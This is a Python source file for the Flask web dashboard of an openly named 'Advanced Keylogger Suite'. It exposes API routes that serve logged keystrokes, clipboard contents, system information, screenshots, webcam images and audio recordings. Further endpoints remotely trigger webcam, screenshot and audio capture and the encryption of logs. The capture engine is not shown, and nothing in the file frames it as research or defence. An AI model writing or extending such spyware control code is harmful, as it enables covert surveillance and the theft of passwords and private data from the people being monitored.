"""
===================================================================
Project: Advanced Keylogger Suite - Web Dashboard
Author: Avi
Date: 2026
Description: Modern REST API backend and Flask web server for
             visualizing live keylogger logs, screenshot gallery,
             webcam snaps, clipboard data, and audio recordings.
===================================================================
"""

import os
import json
from flask import Flask, render_template, jsonify, send_from_directory, request

class WebDashboard:
    def __init__(self, engine, config_path="config.json"):
        self.engine = engine
        self.config_path = config_path
        self.app = Flask(__name__, template_folder="templates", static_folder="static")

        # Disable noisy default logging
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        self.setup_routes()

    def setup_routes(self):
        @self.app.route("/")
        def index():
            return render_template("index.html", author=self.engine.config.get("author", "Avi"))

        @self.app.route("/api/stats")
        def get_stats():
            return jsonify(self.engine.get_stats())

        @self.app.route("/api/logs/keystrokes")
        def get_keystrokes():
            path = self.engine.keys_log_path
            content = ""
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception as e:
                    content = f"Error reading log file: {e}"
            return jsonify({"content": content or "No keystrokes recorded yet."})

        @self.app.route("/api/logs/clipboard")
        def get_clipboard():
            path = self.engine.clipboard_log_path
            content = ""
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception as e:
                    content = f"Error reading clipboard log: {e}"
            return jsonify({"content": content or "No clipboard entries captured yet."})

        @self.app.route("/api/logs/system")
        def get_system_info():
            path = self.engine.system_info_path
            content = ""
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception as e:
                    content = f"Error reading system info: {e}"
            return jsonify({"content": content or "System information loading..."})

        @self.app.route("/api/gallery/<category>")
        def get_gallery(category):
            valid_dirs = {
                "screenshots": self.engine.screenshots_dir,
                "webcam": self.engine.webcam_dir,
                "audio": self.engine.audio_dir
            }
            if category not in valid_dirs:
                return jsonify({"error": "Invalid category"}), 400

            target_dir = valid_dirs[category]
            files = []
            if os.path.exists(target_dir):
                for fname in sorted(os.listdir(target_dir), reverse=True):
                    fpath = os.path.join(target_dir, fname)
                    if os.path.isfile(fpath):
                        files.append({
                            "filename": fname,
                            "size_kb": round(os.path.getsize(fpath) / 1024, 1),
                            "url": f"/api/media/{category}/{fname}"
                        })
            return jsonify({"category": category, "files": files})

        @self.app.route("/api/media/<category>/<filename>")
        def serve_media(category, filename):
            valid_dirs = {
                "screenshots": self.engine.screenshots_dir,
                "webcam": self.engine.webcam_dir,
                "audio": self.engine.audio_dir
            }
            if category not in valid_dirs:
                return "Invalid category", 400

            return send_from_directory(valid_dirs[category], filename)

        @self.app.route("/api/trigger/<action>", methods=["POST"])
        def trigger_action(action):
            if action == "screenshot":
                res = self.engine.trigger_screenshot()
                return jsonify({"success": bool(res), "file": res})
            elif action == "webcam":
                res = self.engine.trigger_webcam()
                return jsonify({"success": bool(res), "file": res})
            elif action == "audio":
                res = self.engine.trigger_audio()
                return jsonify({"success": bool(res), "file": res})
            elif action == "encrypt":
                res = self.engine.encrypt_logs()
                return jsonify({"success": res})
            return jsonify({"error": "Unknown action"}), 400

    def run(self, host="127.0.0.1", port=5000):
        print(f"[*] Starting Web Dashboard at http://{host}:{port}")
        self.app.run(host=host, port=port, debug=False, use_reloader=False)
